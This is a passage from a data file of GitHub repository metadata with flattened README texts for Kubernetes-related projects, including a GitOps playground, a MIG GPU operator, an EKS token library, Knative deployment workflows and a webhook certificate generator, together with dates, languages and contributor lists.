bug in GitHub issues https github com redhat actions oc installer issues and we will fix it as soon as possible,2020-11-09T14:39:58Z,2020-12-18T14:08:51Z,TypeScript,Organization,3,9,3,38,main,lstocchi#tetchel#dependabot[bot]#Divyansh42#mohitsuman#stevemar,6,2,2,1,5,0,2
cloudogu,k8s-gitops-playground,argo#argocd#flux#fluxcd#gitops#helm#jenkins#k8s#kubernetes#scm-manager,k8s gitops playground Reproducible infrastructure to showcase GitOps workflows Derived from our consulting experience https cloudogu com en consulting Table of contents Prerequisites prerequisites Install k3s install k3s Apply apps to cluster apply apps to cluster Applications applications Jenkins jenkins SCM Manager scm manager ArgoCD UI argocd ui Test applications deployed via GitOps test applications deployed via gitops PetClinic via Flux V1 petclinic via flux v1 3rd Party app NGINX via Flux V1 3rd party app nginx via flux v1 PetClinic via Flux V2 petclinic via flux v2 PetClinic via ArgoCD petclinic via argocd Remove apps from cluster remove apps from cluster Options options Multiple stages multiple stages Prerequisites To be able to set up the infrastructure you need a linux machine tested with Ubuntu 20 04 with docker installed All other tools like kubectl k3s and helm are set up using the scripts init cluster sh script Install k3s You can use your own k3s cluster or use the script provided Run this script from repo root with scripts init cluster sh If you use your own cluster note that jenkins relies on the docker mode to be enabled In a real life scenario it would make sense to run Jenkins agents outside the cluster for security and load reasons but in order to simplify the setup for this playground we use this slightly dirty workaround Jenkins builds in agent pods that are able to spawn plain docker containers docker host that runs the containers That s why we need the k3s docker mode Don t use a setup such as this in production The diagrams bellow show an overview of the playground s architecture and a possible production scenario using our Ecosystem https cloudogu com en ecosystem more secure and better build performance using ephemeral build agents spawned in the cloud Playground on local machine A possible production environment with Cloudogu Ecosystem https cloudogu com en ecosystem Playground on local machine https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s gitops playground main docs gitops playground puml fmt svg A possible production environment https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s gitops playground main docs production setting puml fmt svg Apply apps to cluster scripts apply sh scripts apply sh You can also just install one GitOps module like Flux V1 or ArgoCD via parameters Use scripts apply sh help for more information The scripts also prints a little intro on how to get started with a GitOps deployment Applications Jenkins Find jenkins on http localhost 9090 Admin user Same as SCM Manager scmadmin scmadmin Change in jenkins credentials yaml if necessary Note You can enable browser notifications about build results via a button in the lower right corner of Jenkins Web UI Enable Jenkins Notifications docs jenkins enable notifications png Example of a Jenkins browser notifications docs jenkins example notification png SCM Manager Find scm manager on http localhost 9091 Login with scmadmin scmadmin ArgoCD UI Find the ArgoCD UI on http localhost 9092 Login with admin admin Test applications deployed via GitOps PetClinic via Flux V1 Jenkinsfile applications petclinic fluxv1 plain k8s Jenkinsfile for plain k8s deployment localhost 9000 http localhost 9000 Staging localhost 9001 http localhost 9001 Production localhost 9002 http localhost 9002 qa Jenkinsfile applications petclinic fluxv1 helm Jenkinsfile for helm deployment localhost 9003 http localhost 9003 Staging localhost 9004 http localhost 9004 Production 3rd Party app NGINX via Flux V1 Jenkinsfile applications nginx fluxv1 Jenkinsfile localhost 9005 http localhost 9005 Staging localhost 9006 http localhost 9006 Production PetClinic via Flux V2 Jenkinsfile applications petclinic fluxv2 plain k8s Jenkinsfile localhost 9010 http localhost 9010 Staging localhost 9011 http localhost 9011 Production PetClinic via ArgoCD Jenkinsfile applications petclinic argocd plain k8s Jenkinsfile localhost 9020 http localhost 9020 Staging localhost 9021 http localhost 9021 Production Remove apps from cluster scripts destroy sh scripts destroy sh Options Multiple stages This feature is currently only useable for the plain petclinic with fluxv1 You can add additional stages in this Jenkinsfile applications petclinic fluxv1 plain k8s Jenkinsfile for the plain k8s petclinic version with fluxv1 Look for the gitopsConfig map and edit the following entry stages staging deployDirectly true production deployDirectly false qa Just add another stage and define its deploy behaviour by setting deployDirectly to true or false The default is false so you can leave it empty like qa If set to true the changes will deploy automatically when pushed to the gitops repository If set to false a pull request is created After adding a new stage you need to also create k8s files in the corresponding folder So for the stage qa there have to be k8s files in the following folder applications petclinic fluxv1 plain k8s k8s qa applications petclinic fluxv1 plain k8s k8s qa,2020-10-14T08:45:46Z,2020-12-28T10:48:02Z,Shell,Organization,3,8,2,119,main,schnatterer#marekzan#pmarkiewka#phaenr#thoppenheidt,5,0,0,1,0,0,9
jjasghar,ibmcloud-free-k8s-cluster,,Free Kubernetes cluster on IBM Cloud Scope This is a bash script that will spin up the free Kubernetes cluster on IBM Cloud This is also subject to the same conditions that the free cluster is allowed Note After 30 days the cluster will delete You need to figure out a way to back up your deployments and all Also just a friendly link email here to the Email preferances You should set them accordingly otherwise you ll see quite a few come in when the run 15 mins is complete Prereqs ibmcloud CLI installed IBM Cloud API KEY You will also need an APK KEY which is under Access IAM on your IBM Cloud account Or bash ibmcloud iam api key create MyKey d this is my API key file keyfile Usage Create bash create sh API KEY NAMEofCLUSTER Delete bash delete sh API KEY NAMEofCLUSTER Note If you don t name the cluster it will default to mycluster free Let s Encrypt Thanks to Tim Robinson https github com timroster he has figured out how to add Let s Encrypt Valid Certs to our free Kubernetes Clusters Check out this gist https gist github com timroster ad6b915a46a831ee42aae7fc1676e4a3 for the how to License Authors If you would like to see the detailed LICENSE click here LICENSE Author JJ Asghar text Copyright 2020 IBM Inc Licensed under the Apache License Version 2 0 the License you may not use this file except in compliance with the License You may obtain a copy of the License at http www apache org licenses LICENSE 2 0 Unless required by applicable law or agreed to in writing software distributed under the License is distributed on an AS IS BASIS WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND either express or implied See the License for the specific language governing permissions and limitations under the License email https cloud ibm com user notifications,2020-09-04T17:55:17Z,2020-11-06T16:33:22Z,Shell,User,2,8,2,5,master,jjasghar,1,0,0,0,0,0,1
doubledna,k8s-monitor,,kubernetes harbor namespaceprometheus rbac yamlRoleRoleBinding k8sprod phi namespace indonamespaceprometheus rbac 1monitoringnamespace kubectl create namespace monitoring 2prometheus operator kubectl create f bundle yaml kubectl create f prometheus operator servicemonitor 3 prometheus 4 kube state metrics deploymentkube state metricsrbacRoleresource deployment 5 metrics server metric server1API aggregatorapimetrics 2masterflannel 6kube server k8scontrollerschedulerendpointendpointsservicemonitor controllerschedulerkube controller manager service kube scheduler service127 0 0 1 0 0 0 0 controllerhttpkube controller manager service port 0 secure port 10252 prometheus operator prometheus operatorCRDControllerPrometheus OperatorcontrollerBRACPrometheus Server prometheus kube state metrics podservice deployment metrics server nodepodsCPUMemory kube server k8s alertmanager prometheus alertmanageralertmanager ymlalertmanager pod 1alertmanager main secret kubectl delete secret alertmanager main n monitoring 2alertmanageryaml alertmanager yaml createsecret kubectl create secret generic alertmanager main from file alertmanager yaml n monitoring,2020-10-12T04:23:14Z,2020-11-10T14:12:53Z,n/a,User,2,8,0,1,main,doubledna,1,0,0,0,0,0,0
renatogroffe,ASPNETCore3.1-REST_API-SpecFlow-xUnit-Swagger-K8s-Docker_JurosCompostos,,,2020-09-15T21:19:18Z,2020-12-10T15:32:37Z,C#,User,1,8,3,3,master,renatogroffe,1,0,0,0,0,0,0
tdihp,dspcap,,dspcap A humble bash script set that uses daemonset to capture tcpdump from all k8s nodes then collect the captures How to use As simple as 1 Call dspcap start script to start capture 2 Call dspcap stop script to stop capture and collect result to dspcap directory Finetune tcpdump command Currently modify the dspcap start script directly,2020-08-30T02:05:06Z,2020-12-25T03:05:56Z,Shell,User,1,8,4,1,master,tdihp,1,0,0,1,0,1,0
riskfuel,k8s-mig-operator,a100#deeplearning#dgx#docker#gpu#kubernetes#mig#nvidia,NVIDIA MIG kubernetes operator A simple python based kubernetes operator for managing nvidia MIG instances on A100 nodes Prerequisites node requirements A kubernetes 1 17 cluster Your A100 MIG nodes should already be members of the cluster For nodes in which you wish to enable MIG MIG is supported only on NVIDIA A100 products and associated systems using A100 CUDA 11 and NVIDIA driver 450 36 06 or later CUDA 11 supported Linux operating system distributions nvidia docker2 with docker 19 03 or higher Quickstart If you plan to allow the operator to perform resets currently running a reboot see the configuring secure node access docs docs configuring secure node access md before continuing Install the operator daemons bash helm repo add k8s mig operator https riskfuel github io k8s mig operator helm repo update helm install mig operator k8s mig operator k8s mig operator version 0 1 1 set deployNamespace default set dryRun false set allowNodeReset true set sshSecretName migoperator secret set deployNvidiaPlugins true set operatorName example mig operator set operatorNamespace default set image riskfuel k8s mig operator 0 1 1 Create an operator CRD Note You can use the examples in deployments examples as a base kubectl apply f spec yaml apiVersion operators riskfuel com v1alpha1 kind MigOperator metadata name mig operator namespace default spec nodes hostname of node nodehostname remoteuser remote user if not specified features like toggling mig or switching strategies wont be available secretName migoperator secret Options for MIG instance profiles 7g 40gb 4g 20gb 3g 20gb 2g 10gb 1g 5gb Options for compute instance profiles 7g 40gb 4c xg ygb 3c xg ygb 2c xg ygb 1c xg ygb NOTE nvidia device plugin does not support non default compute sizes however we still currently support creating these instances devices gpu 0 migEnabled True gpuInstances profile 7g 40gb computeInstances 7g 40gb gpu 1 migEnabled True gpuInstances profile 7g 40gb computeInstances 7g 40gb gpu 2 migEnabled True gpuInstances profile 7g 40gb computeInstances 7g 40gb gpu 3 migEnabled True gpuInstances profile 7g 40gb computeInstances 7g 40gb gpu 4 migEnabled True gpuInstances profile 7g 40gb computeInstances 7g 40gb gpu 5 migEnabled True gpuInstances profile 7g 40gb computeInstances 7g 40gb gpu 6 migEnabled True gpuInstances profile 7g 40gb computeInstances 7g 40gb gpu 7 migEnabled True gpuInstances profile 7g 40gb computeInstances 7g 40gb Capabilities x delete gpu instances if they are not requested by the operator also removes any comp instances on the gpu instance x create missing gpu instances x delete compute instances x create compute instances x toggle mig for a gpu requires reboot reset currently Contributing See contributing doc here docs contributing md,2020-08-17T12:32:42Z,2020-08-31T18:59:26Z,Python,Organization,6,8,0,81,master,Addyvan#nick-fung,2,3,3,0,0,0,8
peak-ai,eks-token,boto3#eks#k8s#k8scluster#python#token,eks token EKS Token package an alternate to aws eks get token CLI CodeQuality https github com peak ai eks token workflows CodeQL badge svg Publish https github com peak ai eks token workflows Upload 20Python 20Package badge svg stable https img shields io github v release peak ai eks token https img shields io github v release peak ai eks token includeprereleases https img shields io github license peak ai eks token https img shields io github languages count peak ai eks token https img shields io github languages top peak ai eks token https img shields io github issues raw peak ai eks token https img shields io github issues pr raw peak ai eks token https img shields io github languages code size peak ai eks token https img shields io github repo size peak ai eks token logo https raw githubusercontent com peak ai eks token master eks iam png Usage Installation shell pip install eks token Basic usage python from ekstoken import gettoken from pprint import pprint response gettoken clustername pprint response Expected Output python apiVersion client authentication k8s io v1alpha1 kind ExecCredential spec status expirationTimestamp 2020 10 01T15 05 17Z token k8s aws v1 Extract token from response python from ekstoken import gettoken token gettoken clustername value status token print token Get Token signed for particular IAM role Pass rolearn argument to the function python from ekstoken import gettoken token gettoken clustername rolearn status token print token Contribution Check our guidelines here CONTRIBUTING md,2020-09-28T11:52:14Z,2020-10-28T05:09:51Z,Python,Organization,1,8,1,11,master,azhar22k,1,1,1,0,0,0,2
gritzkoo,golang-health-checker,go#golang#hacktoberfest#hacktoberfest2020#health-check#healthcheck#k8s#liveness-probe#pods#readiness-probe,golang health checker test https github com gritzkoo golang health checker workflows test badge svg branch master Build Status https travis ci org gritzkoo golang health checker svg branch master https travis ci org gritzkoo golang health checker Coverage Status https coveralls io repos github gritzkoo golang health checker badge svg branch master https coveralls io github gritzkoo golang health checker branch master GitHub go mod Go version https img shields io github go mod go version gritzkoo golang health checker GitHub repo size https img shields io github repo size gritzkoo golang health checker GitHub https img shields io github license gritzkoo golang health checker GitHub issues https img shields io github issues gritzkoo golang health checker Go Report Card https goreportcard com badge github com gritzkoo golang health checker https goreportcard com report github com gritzkoo golang health checker A simple package to allow you to track your application healthy providing two ways of checking Simple will return a fully functional string and with this you can check if your application is online and responding without any integration check Detailed will return a detailed status for any integration configuration informed on the integrations just like in the examples below How to install If you are just starting a Go projetct you must start a go mod file like below sh go mod init github com my repo Or else you already has a started project just run the command below sh go get github com gritzkoo golang health checker How to use In this example we will use the Echo web server to show how to import and use Simple and Detailed calls If you want check the full options in configurations look this IntegrationConfig struct https github com gritzkoo golang health checker blob master pkg healthcheck structs go L45 L54 Available integrations x Redis x Memcached x Web integration https go package main import net http github com gritzkoo golang health checker pkg healthcheck github com labstack echo github com labstack echo middleware func main all the content below is just an example Echo instance e echo New Middleware e Use middleware Logger e Use middleware Recover example of simple call e GET health check liveness func c echo Context error return c JSON http StatusOK healthcheck HealthCheckerSimple example of detailed call e GET health check readiness func c echo Context error define all integrations of your application with type healthcheck ApplicationConfig myApplicationConfig healthcheck ApplicationConfig check the full list of available props in structs go Name You APP Name optional prop Version V1 0 0 optional prop Integrations healthcheck IntegrationConfig mandatory prop Type healthcheck Redis this prop will determine the kind of check the list of types available in structs go Name redis user db the name of you integration to display in response Host redis you can pass host port and omit Port attribute Port 6379 DB 0 default value is 0 Type healthcheck Memcached this prop will determine the kind of check the list of types available in structs go Name Memcached server the name of you integration to display in response Host memcache you can pass host port and omit Port attribute Port 11211 Type healthcheck Web this prop will determine the kind of check the list of types available in structs go Name Github Integration the name of you integration to display in response Host https github com status you can pass host port and omit Port attribute TimeOut 5 default value to web call is 10s Headers healthcheck HTTPHeader to customize headers to perform a GET request Key Accept Value application json return c JSON http StatusOK healthcheck HealthCheckerDetailed myApplicationConfig Start server e Logger Fatal e Start 8888 This simple call will return a JSON as below json status fully functional And detailed call will return a JSON as below json name You APP Name status true here is the main status of your application when one of the integrations fails false will return version V1 0 0 date Mon Jan 2 15 04 05 MST 2006 Duration 0 53102304 integrations name redis user db kind Redis DB status true responsetime 0 001160881 url localhost 6379 name Memcached server kind Memcached DB status true responsetime 0 036013866 url localhost 11211 name Github Integration kind Web service API status true responsetime 0 493425975 url https github com status Kubernetes liveness and readiness probing And then you could call this endpoints manually to see your application health but if you are using modern kubernetes deployment you can config your chart to check your application with the setup below yaml apiVersion v1 kind Pod metadata labels test liveness name liveness http spec containers name liveness image go your application image args server livenessProbe httpGet path health check liveness port 80 httpHeaders name Custom Header value Awesome initialDelaySeconds 3 periodSeconds 3 name readiness image go your application image args server readinessProbe httpGet path health check readiness port 80 httpHeaders name Custom Header value Awesome initialDelaySeconds 3 periodSeconds 3,2020-09-09T19:08:38Z,2020-11-09T11:48:50Z,Go,User,1,8,0,8,master,gritzkoo,1,10,11,0,0,0,6
jeanbaptisteng,bottlerocket-cloudformation,amazon#amazon-eks#aws#bottlerocket#bottlerocket-cloudformation#cloudformation#eks-cluster#k8s#kubernetes#spot-instance,Amazon BottleRocket Cloudformation Template for Amazon EKS This is an unoffical Cloudformation template to build BottleRocket based of node group for the convenience of upgrading existing Ubuntu Amazon Linux based workernode to BottleRocket based seamlessly Most of this is one time setup If you already have an EKS cluster and familar with Cloudformation please download the template and skip to the last step Dependencies The tools required to implement the whole cluster and workernode group is very simple Just the latest version of awscli https aws amazon com cli and web browser that can access AWS WebConsole is enough Downloads Both CloudFormation Template for on demand instances autoscaling group and spot instances autoscaling group are availiable here Yes we support SPOT instances On Demand Instance https raw githubusercontent com jeanbaptisteng bottlerocket cloudformation master bottlerocket yaml SPOT Instance https raw githubusercontent com jeanbaptisteng bottlerocket cloudformation master bottlerocket spot yaml Quickstart New EKS cluster Installation 1 Create EKS role that include the follow permission to allow EKS cluster to manage resources in EKS ie arn aws iam XXXXXXXXXX role eksServiceRole arn aws iam aws policy AmazonEKSClusterPolicy arn aws iam aws policy AmazonEKSServicePolicy arn aws iam aws policy AmazonEKSVPCResourceController 2 Create EC2 role that include the follow permission in order to create and control the EKS cluster on the baston host ie arn aws iam XXXXXXXXX role eks controller prd Policy 1 Version 2012 10 17 Statement Effect Allow Action sts eks Resource Effect Allow Action iam Resource arn aws iam XXXXXXXXXX role eksServiceRole Policy 2 AmazonEKSClusterPolicy 3 Execute the following command to create a new EKS private cluster aws eks create cluster name EKS cluster name role arn EKS role in Step 2 resources vpc config subnetIds Internal Subnet 1 Internal Subnet 2 Internal Subnet 3 securityGroupIds New SG that enable traffic within SG endpointPublicAccess false endpointPrivateAccess true tags Tag region AWS Region 4 Gather the EKS Cluster information in AWS WebConsole https console aws amazon com eks home BottleRocket WorkerNode Group setup 1 Open CloudFormation Webconsole https console aws amazon com cloudformation in Web Browser 2 Click Create Stack With existing resources standard to enter Create stack page 3 Select Template is ready Upload a template file 4 In the dialogue choose the template downloaded from the git 5 Fill in the blanks and select the desired sizing of the EC2 instance of the EKS WorkerNode group 6 Confirm the information before creating resources related to the CloudFormation Template 7 Check the new IAM role attached on new workernode in EC2 webconsole for new workernode group only aws auth cm yaml apiVersion v1 kind ConfigMap metadata name aws auth namespace kube system data mapRoles rolearn username system node EC2PrivateDNSName groups system bootstrappers system nodes 8 Apply the configuration This command may take a few minutes to finish kubectl apply f aws auth cm yaml License This is licensed under GNU GENERAL PUBLIC LICENSE Components enhancing Kubernetes Cluster NodelocalDNS https github com jeanbaptisteng bottlerocket cloudformation tree master plugins NodeLocalDNS Fluentd https github com jeanbaptisteng bottlerocket cloudformation tree master plugins Fluentd See also BottleRocket Official Quickstart guide https github com bottlerocket os bottlerocket blob develop QUICKSTART EKS md,2020-09-04T16:31:26Z,2020-11-09T11:30:31Z,Shell,User,2,8,2,9,master,jeanbaptisteng,1,0,2,0,0,0,0
didier-durand,knative-on-cloud-kubernetes,amazon#aws#cloud#gcp#github#google-cloud#istio#k8s#knative#kubernetes#workflow,Knative Serving on cloud based Kubernetes workflow badge https github com didier durand knative on cloud kubernetes workflows Deploy 20Knative 20on 20GKE badge svg workflow badge https github com didier durand knative on cloud kubernetes workflows Deploy 20Knative 20on 20EKS badge svg This repository can be re used in subsequent projects as the initial stage of a live test bed to leverage the feaures of Knative project https knative dev sponsored by Google for serverless workloads it is implemented on Google Cloud Platform GCP and Amazon Web Services AWS via a fully automated Github workflows see files gcloud gke knative yml https github com didier durand knative on cloud kubernetes blob master github workflows gcloud gke knative yml and aws eks knative yml https github com didier durand knative on cloud kubernetes blob master github workflows aws eks knative yml This workflow creates a standard Kubernetes cluster on the cloud either Google Kubernetes Engine GKE https cloud google com kubernetes engine or Amazon EKS https aws amazon com eks When the cluster is up the workflow deploys the required Knative components and dependencies Then it rolls out a couple of Knative mock up Docker services validates their proper unitary functioning Finally it checks the scalability feature of Knative before termination via deletion of the deployed services and of the cluster As per Knative documentation https knative dev docs Knative extends Kubernetes to provide a set of middleware components that are essential to build modern source centric and container based applications that can run anywhere on premises in the cloud or even in a third party data center Each of the components under the Knative project attempt to identify common patterns and codify the best practices that are shared by successful real world Kubernetes based frameworks and applications So two different containers are deployed on Knative their proper execution is validated The autoscale go https knative dev v0 16 docs serving autoscaling autoscale go image allows requests with parameters to consume more or less cpu and memory check via query specific query parameters while helloworld go https knative dev v0 17 docs serving samples hello world helloworld go Docker image is limited to a unique and trivial response We deploy helloworld go with official Knative client kn https github com knative client with minimal command line options to demonstrate as easy as it can get for the developer kn service create image nname env But a rich set of deployment options is provided as per reference documentation https github com knative client blob master docs cmd knservicecreate md The autoscale go service is deployed via a YAML file describing a Knative service The outcome of the recurring executions of the workflow and all the messages produced by those runs can be checked in the Actions tab https github com didier durand knative on cloud kubernetes private actions of this repository Also the logs of any execution can be downloaded as text files via download log archive of the job dashboard for further analysis The workflow is executed at least weekly via Github s cron to make sure that it remains fully operational Google Cloud Run https cloud google com run is Google s own implementation of the Knative stack with some limitations https ahmet im blog cloud run is a knative integrated with other services of GCP But this workflow demonstrates how to implement Knative on a raw Kubernetes cluster when a fully controlled implementation is desired Current version of this repository is limited to implementation Knative Serving Why Knative As said above Knative OSS project sponsored by Google is implemented on GCP as service Cloud Run https cloud google com run and integrated with the other services logging monitoring iam etc of the platform It is very easy to use check out Deploy to Cloud Run of our other repository collating GitHub based CI CD workflows But if your workloads run elsewhere on premise other public cloud etc or if you desire to avoid lock in with a specific vendor and you still want to enjoy the benefits of serverless the Serving block see its archiecture in Figure 1 source N Kaviani al https www researchgate net publication 336567672TowardsServerlessasCommodityacaseofKnative of Knative delivers horizontal scalability resiliency and deep observability for your application services by leveraging those same core characteristics of Kubernetes But it abstracts them through a CLI named kn https github com knative client blob master docs cmd knservice md Several versions of the same service can be active simultaneously and Knative can organize fractional routing between them to allow incremental rollout of new versions of the application Via the setup of Prometheus https prometheus io Knative can deliver exhaustive metrics accessible through Grafana https grafana com Additionally Knative implements fluentd https www fluentd org to collect logs make them accessible via Kibana https www elastic co kibana or centralize them in a global logger like Google Cloud Logging https cloud google com logging Also traces of dialog between the service and its clients can also be collected via the setup of either Zipkin https zipkin io or Jaeger https www jaegertracing io So added to the use of Istio https istio io in the core implementation of Knative the full spectrum of observability is thoroughly covered to allow high QoS at scale Knative is solely focused on those serverless workloads which are autonomous they rely on single and independent containers to deliver their service Clearly it doesn t cover the full spectrum of large scale and sophisticated applications relying on additional services in other containers to run properly But for well designed applications a fair amount of their services can usually be implemented through Knative to obtain optimal efficiency they will benefit from the advantages again scalability resiliency etc of the core underlying Kubernetes infrastructure used by the other parts of the application without the need to develop the sophisticated configuration required to be a good K8s citizen Autoscaling with Knative Section Scalability test below demonstrates the automated scaling delivered as a core feature of Knative the autoscaing algorithm is detailed on Knative Autoscaling page https knative dev v0 15 docs serving samples autoscale go algorithm and Knative Serving Autoscaling System https github com knative serving blob master docs scaling SYSTEM md The initial kubectl get pods n default demonstrates that the workload containers for autoscale go was scaled down to zero due to initial inactivity After 90s of http traffic maintaining 350 requests as per hey https github com rakyll hey command line in parallel the final kubectl get pods n default shows that 5 autoscale go additional pods for a total of 6 autoscale go pods were launched by Knative to sustain the demand because autoscale go can be parametrized to generate resource demanding workloads here biggest prime number under 10 000 and 5 MB memory consumption In comparison 200k requests to helloworld go are then executed again with hey The throughput gets much higher 1 420 qps because helloworld go responses don t require much resources at all They last 390 seconds in total with an average throughput of 1 280 requests per second For that purpose as per final kubectl get pods n default Knative didn t scale up at all a single pod is sufficient NB for the histogram of response times hey measures the full round trip time between the Github CI CD platform on Microsoft Azure datacenters and Google GCP datacenters because hey is run on GitHub while Knative is hosted on GKE Steps of Github workflow 1 checkout the project from git repository in CI CD runner provided by Github 2 setup the gcloud SDK with proper credentials to interact with GCP services 3 get gcloud and info version if needed for debugging 4 cleanup existing GKE cluster of previous run if any 5 create fresh GKE cluster with default add ons for this run The additional parameters allow cluster autoscaling between 1 and 10 nodes of instance type n1 standard 4 https cloud google com compute docs machine types 6 gcloud container clusters get credentials updates kubeconfig file with appropriate credentials and endpoint information to make kubectl usable with the newly created cluster 7 install Istio operator an implementation of standard K8s Custom Resource Definition CRD feature https kubernetes io docs concepts extend kubernetes api extension custom resources This install is done via istioctl whose nightly build is downloaded on the fly to proceed We check via kubectl grep the presence of expected services and pods 8 Install the K8s CRD for Knative Serving feature block 9 Install the core components for Knative Serving feature block 10 Install the Istio controller for Knative Serving feature block 11 Check if full setup of GKE Istio Knative is working properly We check via kubectl grep the presence of expected services and pods 12 Install a test Go workload coming from Knative tutorial https knative dev docs serving getting started knative app 13 Deploy the tutum hello world image as a Knative workload and use an http request to validate its proper functioning 14 Delete the cluster and all its resources created for this execution Setup for forks To fork and run this project in your own Github account you only need to GCP Create a test project in your GCP account and define it as a Github secret named secrets GCPPROJECT in workflow YAML Define a service account in GCP IAM with Project Owner role to make security definitions simpler download its secret key and define the value of a Github secret named secrets GCPSAKEY with the downloaded json AWS Define a user in AWS IAM with full admin rights to make security definitions simpler download its access key and secret key to define 2 secrets secrets AWSACCESSKEYID and secrets AWSSECRETKEY Finally define the region that you want to work in as secrets AWSREGION Scalability test See above for some comments results with autoscale go run hey Summary Total 90 1358 secs Slowest 3 1309 secs Fastest 0 1320 secs Average 0 1411 secs Requests sec 353 9438 Total data 3189679 bytes Size request 99 bytes Response time histogram 0 132 1 0 432 31852 0 732 0 1 032 0 1 332 0 1 631 0 1 931 0 2 231 0 2 531 0 2 831 13 3 131 37 Latency distribution 10 in 0 1336 secs 25 in 0 1352 secs 50 in 0 1364 secs 75 in 0 1373 secs 90 in 0 1390 secs 95 in 0 1407 secs 99 in 0 1506 secs Details average fastest slowest DNS dialup 0 0001 secs 0 1320 secs 3 1309 secs DNS lookup 0 0000 secs 0 0000 secs 0 0016 secs req write 0 0000 secs 0 0000 secs 0 0007 secs resp wait 0 1410 secs 0 1320 secs 3 0980 secs resp read 0 0001 secs 0 0000 secs 0 0015 secs Status code distribution 200 31903 responses get pods after NAME READY STATUS RESTARTS AGE autoscale go t2zm7 deployment 6446d97d5b 8mxwt 2 2 Running 0 90s autoscale go t2zm7 deployment 6446d97d5b d2f46 2 2 Running 0 87s autoscale go t2zm7 deployment 6446d97d5b dkgnd 2 2 Running 0 89s autoscale go t2zm7 deployment 6446d97d5b lvm6q 2 2 Running 0 89s autoscale go t2zm7 deployment 6446d97d5b njlnd 2 2 Running 0 87s autoscale go t2zm7 deployment 6446d97d5b xg89r 2 2 Running 0 89s helloworld go rzznz 1 deployment 5b64869744 pq7hz 1 2 Terminating 0 4m58s results with helloworld go run hey Summary Total 140 7448 secs Slowest 0 1092 secs Fastest 0 0307 secs Average 0 0350 secs Requests sec 1421 0119 Total data 4000000 bytes Size request 20 bytes Response time histogram 0 031 1 0 039 189442 0 046 9240 0 054 1023 0 062 157 0 070 58 0 078 21 0 086 14 0 094 3 0 101 6 0 109 35 Latency distribution 10 in 0 0322 secs 25 in 0 0339 secs 50 in 0 0348 secs 75 in 0 0355 secs 90 in 0 0370 secs 95 in 0 0387 secs 99 in 0 0445 secs Details average fastest slowest DNS dialup 0 0000 secs 0 0307 secs 0 1092 secs DNS lookup 0 0000 secs 0 0000 secs 0 0020 secs req write 0 0000 secs 0 0000 secs 0 0027 secs resp wait 0 0349 secs 0 0307 secs 0 0848 secs resp read 0 0000 secs 0 0000 secs 0 0052 secs Status code distribution 200 200000 responses get pods after NAME READY STATUS RESTARTS AGE helloworld go rzznz 1 deployment 5b64869744 pq7hz 2 2 Running 0 3m28s,2020-09-09T04:44:23Z,2020-12-26T22:42:31Z,n/a,User,1,8,1,14,master,didier-durand,1,0,0,0,0,0,0
codeedu,live-k8s-ci-cd,,,2020-10-31T00:16:24Z,2020-11-07T19:35:32Z,Go,Organization,2,7,4,7,main,wesleywillians,1,0,1,0,0,0,0
rfyiamcool,k8scache,,K8SCACHE local cache for kubernetes apiserver cache k8scache is based on client go informer Feature support resource list namespace pod node service replicaSet deployment daemonSet statefulSet event endpoints Usage go func TestSimple t testing T cli err NewClient assert Equal t err nil err cli BuildForKubecfg assert Equal t err nil cc err NewClusterCache cli assert Equal t err nil pods err cc ListPods assert Equal t err nil assert Greater t len pods Items 0 cc Start cc SyncCache nslist err cc GetNamespaces assert Equal t err nil assert Greater t len nslist 0 fmt Printf namespace list v nn nslist nodes err cc GetNodes assert Equal t err nil assert Greater t len nodes 0 fmt Printf nodes list v nn nodes mpods err cc GetPodsWithNS default assert Equal t err nil assert Greater t len mpods 0 fmt Printf default pods list v nn mpods svcs err cc GetServicesWithNS default assert Equal t err nil assert Greater t len svcs 0 fmt Printf default services list v nn svcs reps err cc GetReplicasWithNS default assert Equal t err nil assert Greater t len reps 0 fmt Printf default replicas list v nn reps dms err cc GetDeploymentsWithNS default assert Equal t err nil assert Greater t len dms 0 fmt Printf default deployments list v nn dms time AfterFunc 1 time Second func cc Stop cc Wait,2020-11-25T09:26:00Z,2020-12-04T10:12:05Z,Go,User,1,7,0,14,main,rfyiamcool,1,0,7,0,1,0,2
Trendyol,k8s-webhook-certificator,certificates#helm#helm-hook#kubernetes#kubernetes-job#kubernetes-tls-management,certificator Creating K8S Secret which type is tls that includes corresponding client certificates which is signed by K8S CA and private key Description Generate a certificate suitable for use with a webhook service This cli tool uses k8s CertificateSigningRequest API to generate a certificate signed by k8s CA suitable for use with sidecar injector webhook services This requires permissions to create and approve CSR See Kubernetes TLS management https kubernetes io docs tasks tls managing tls in a cluster for detailed explanation and additional instructions The server key cert will be stored in a k8s secret More detail at https medium com trendyol tech tls certificates for kubernetes admission webhooks made easy with certificator and helm hook 89ece42fa193 Understanding the problem When we started to develop an Kubernetes Admission Webhook we notice that there was a requirement that enforced by the apiserver for the admission webhook server and this is TLS connection so apiserver and admission webhook server must connect via TLS with each other See Contacting the webhook https kubernetes io docs reference access authn authz extensible admission controllers contacting the webhook To ensure that we need a CA Certificate Authority and a client certificate which is signed by this CA There are many ways to do that like creating a scripts that create CA and a client itself using openssl cli or using Kubernetes TLS management which is create client certificates by approving CSR s But both ways when we decide to use Helm are a not become part of the Helm process they are just a step before applying Helm release So how can we become this step a part of this Helm process Easy Helm Hooks and a little code written with golang Solution With the help of Helm Hooks we can solve the problem of creating a setup step before installing all the templates to the cluster Then if we create a cli tool that helps us to create CSR with a client certificate which is approved by this CSR with CA which is belongs to Kubernetes cluster itself and then creating a Kubernetes Secret which includes private key and a client certificate then we will have successfully completed the process by calling this cli tool in Kubernetes Job,2020-10-28T13:19:30Z,2020-11-23T14:09:10Z,Go,Organization,11,7,0,9,main,developer-guy#Dentrax,2,5,5,0,0,0,0
